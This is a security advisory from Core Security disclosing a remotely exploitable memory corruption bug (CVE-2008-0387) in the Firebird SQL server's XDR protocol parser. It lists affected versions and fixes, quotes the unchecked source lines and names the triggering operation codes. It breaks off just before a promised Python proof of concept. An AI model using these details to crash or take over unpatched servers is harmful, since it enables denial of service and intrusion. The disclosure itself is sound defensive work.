           Firebird Remote Memory Corruption

*Advisory Information*

Title: Firebird Remote Memory Corruption
Advisory ID:  CORE-2007-1219
Advisory URL: http://www.coresecurity.com/?action=item&id=2095
Date published: 2008-01-28
Date of last update: 2008-01-24
Vendors contacted: Firebird SQL
Release mode: Coordinated Release

*Vulnerability Information*

Class: Memory corruption
Remotely Exploitable: Yes
Locally Exploitable: Yes
Bugtraq ID: 27403
CVE Name: CVE-2008-0387

*Vulnerability Description*

Firebird [1][2] is a relational database that runs on Linux, Windows,
and a variety of Unix platforms. The Firebird Project is a commercially
independent project of C and C++ programmers, technical advisors and
supporters developing and enhancing a multi-platform relational database
management system based on the source code released by Inprise Corp (now
known as Borland Software Corp) on 25 July, 2000.

The Firebird database manager contains an Integer Overflow in the
processing of certain tags on the XDR protocol used for communication
with the server. This led the server to corrupt the process memory and
crash. Repeated attempts are followed by a crash of the process in
charge of restarting the database server. This may also grant attackers
remote execution of arbitrary code on servers running Firebird.

*Vulnerable packages*

. Firebird SQL 1.0.3 and before.
. Firebird SQL 1.5.5 and before.
. Firebird SQL 2.0.3 and before.
. Firebird SQL 2.1.0 Beta 2 and before.

*Non-vulnerable packages*

. Firebird SQL 1.5.6 (to be released)
. Firebird SQL 2.0.4 (to be released)
. Firebird SQL 2.1.0 RC1

*Vendor Information, Solutions and Workarounds*

Firebird v2.1.0 RC1 fixes this vulnerability and is available for
download at http://firebirdsql.org/index.php?op=files&id=fb210_RC1

The fix will also be included in versions v1.5.6 and v2.0.4.  Version
2.0.4 will be released in February. The version 1.5.6 release is
expected later this year.

The issue is registered [3] in Firebird Tracker as CORE-1681.

*Credits*

This vulnerability was discovered and researched by Damian Frizza with
assistance of Alfredo Ortega from Core Security Technologies.

*Technical Description / Proof of Concept Code*

The memory corruption happens when the parser (src/remote/protocol.cpp)
receives any of the following operations with invalid data:

op_receive
op_start
op_start_and_receive
op_send
op_start_and_send
op_start_send_and_receive

The parser fails to properly sanitize certain variables before use. We
can see that in the file src/remote/protocol.cpp there are the following
assignments directly from the packet buffer to the data structure,
without any validation (The MAP macro doesn't have any range checking):

src/remote/protocol.cpp:417

		MAP(xdr_short, reinterpret_cast<SSHORT&>(data->p_data_request));
		MAP(xdr_short, reinterpret_cast<SSHORT&>(data->p_data_incarnation));
		MAP(xdr_short, reinterpret_cast<SSHORT&>(data->p_data_transaction));
		MAP(xdr_short, reinterpret_cast<SSHORT&>(data->p_data_message_number));
		/* Changes to this op's protocol must mirror in xdr_protocol_overhead */
		return xdr_request(xdrs, data->p_data_request,
			data->p_data_message_number,
			data->p_data_incarnation) ? P_TRUE(xdrs, p) : P_FALSE(xdrs, p);

And in the function xdr_request(), the variable data->p_data_request (as
request_id) is used to index an array:

	...
	rrq* request = (rrq*) port->port_objects[request_id];
	...

Corrupting memory structures and causing a DoS of the server, with
possible execution of code. The same happens with the variable
data->p_data_message_number.

The following python PoC causes a remote Denial of service and
demonstrates the bug:
